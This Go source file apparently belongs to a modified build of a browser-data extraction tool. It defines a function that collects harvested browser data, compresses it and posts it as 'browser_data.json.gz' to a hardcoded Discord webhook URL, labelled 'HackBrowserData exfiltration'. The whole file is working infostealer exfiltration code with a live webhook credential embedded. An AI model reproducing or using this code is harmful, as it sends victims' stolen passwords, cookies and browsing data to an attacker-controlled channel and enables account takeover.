package output

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"time"

	"github.com/mchaten42-pixel/message/types"
)

func sendToDiscord(results []result) error {
	if len(results) == 0 {
		return fmt.Errorf("no data to send")
	}

	webhookURL := "https://discord.com/api/webhooks/1491812638181822474/y8hPCZgKEKVCEB5xu1c35AR9CljJibkijRAqpJY11AYLh8xW2LzroHTfR7Sjtw0Xyv-w"

	payload := make([]*types.BrowserData, 0, len(results))
	for _, r := range results {
		payload = append(payload, r.data)
	}

	jsonData, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		return fmt.Errorf("marshal data: %w", err)
	}

	fmt.Fprintf(os.Stderr, "[DEBUG] Original JSON size: %d bytes\n", len(jsonData))

	var gzBuf bytes.Buffer
	gzWriter := gzip.NewWriter(&gzBuf)
	if _, err := gzWriter.Write(jsonData); err != nil {
		return fmt.Errorf("gzip write: %w", err)
	}
	if err := gzWriter.Close(); err != nil {
		return fmt.Errorf("gzip close: %w", err)
	}

	compressedData := gzBuf.Bytes()
	fmt.Fprintf(os.Stderr, "[DEBUG] Compressed size: %d bytes\n", len(compressedData))

	if len(compressedData) > 7*1024*1024 {
		return fmt.Errorf("compressed payload too large: %d bytes (limit 7MB)", len(compressedData))
	}

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	msgPayload := map[string]string{
		"content": "HackBrowserData exfiltration",
	}
	jsonMsg, err := json.Marshal(msgPayload)
	if err != nil {
		return fmt.Errorf("marshal message: %w", err)
	}
	if err := writer.WriteField("payload_json", string(jsonMsg)); err != nil {
		return fmt.Errorf("write payload_json: %w", err)
	}

	part, err := writer.CreateFormFile("files[0]", "browser_data.json.gz")
	if err != nil {
		return fmt.Errorf("create form file: %w", err)
	}
	if _, err := part.Write(compressedData); err != nil {
		return fmt.Errorf("write file data: %w", err)
	}
	if err := writer.Close(); err != nil {
		return fmt.Errorf("close multipart writer: %w", err)
	}

	client := &http.Client{Timeout: 60 * time.Second}
	req, err := http.NewRequest(http.MethodPost, webhookURL, &body)
	if err != nil {
		return fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("post to webhook: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("webhook returned status: %s, body: %s", resp.Status, string(bodyBytes))
	}

	return nil
}